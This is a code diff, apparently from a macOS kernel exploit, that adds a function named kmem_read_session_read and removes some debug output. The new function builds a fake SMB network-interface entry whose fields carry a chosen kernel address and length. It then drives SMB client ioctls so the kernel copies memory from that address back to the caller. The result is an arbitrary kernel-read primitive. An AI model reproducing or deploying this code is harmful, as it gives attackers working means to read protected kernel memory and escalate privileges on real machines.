@@ -113,9 +113,6 @@ void kmem_read_session_build_iod(kmem_read_session_t session, const struct socka
     struct kmem_zkext_alloc_small_entry fake_iod_alloc = kmem_zkext_alloc_small(smb_addr, 255, AF_INET, (char*)&fake_iod + fake_iod_start, 255 - 8);
     uintptr_t fake_iod_addr = fake_iod_alloc.address + 8 - fake_iod_start;
     
-    printf("addr_list: %p\n", fake_nic_entry->addr_list.tqh_first);
-    xe_log_debug_hexdump(fake_nic_entry, sizeof(*fake_nic_entry), "fake nic entry: ");
-    
     session->iod_alloc = fake_iod_alloc;
     session->iod_addr = fake_iod_addr;
     session->nic_entry_addr = fake_iod_addr + offsetof(struct smbiod, iod_gss.gss_spn);
@@ -169,6 +166,31 @@ kmem_read_session_t kmem_read_session_create(const struct sockaddr_in* smb_addr)
     
     kmem_allocator_nrnw_destroy(&nrnw_allocator);
     return kmem_read_session;
+}
+
+int kmem_read_session_read(kmem_read_session_t session, int smb_dev_fd, void* dst, uintptr_t src, size_t size) {
+    xe_assert_cond(size, <=, UINT32_MAX);
+    
+    int error = smb_client_ioc_auth_info(smb_dev_fd, NULL, UINT32_MAX, NULL, UINT32_MAX, NULL);
+    if (error) {
+        xe_assert_cond(error, ==, EINVAL);
+        return error;
+    }
+    
+    struct network_nic_info nic_info;
+    bzero(&nic_info, sizeof(nic_info));
+    nic_info.nic_index = FAKE_SESSION_NIC_INDEX;
+    nic_info.nic_link_speed = ((uint64_t)size) << 32;
+    nic_info.nic_caps = (uint32_t)((uintptr_t)src);
+    nic_info.nic_type = (uint32_t)((uintptr_t)src >> 32);
+    memcpy(&nic_info.addr, &FAKE_SESSION_NIC_ADDR, sizeof(FAKE_SESSION_NIC_ADDR));
+    
+    error = smb_client_ioc_update_client_interface(smb_dev_fd, &nic_info, 1);
+    xe_assert_err(error);
+    
+    error = smb_client_ioc_auth_info(smb_dev_fd, dst, (uint32_t)size, NULL, UINT32_MAX, NULL);
+    xe_assert_err(error);
+    return 0;
 }
 
 uintptr_t kmem_read_session_get_addr(kmem_read_session_t session) {
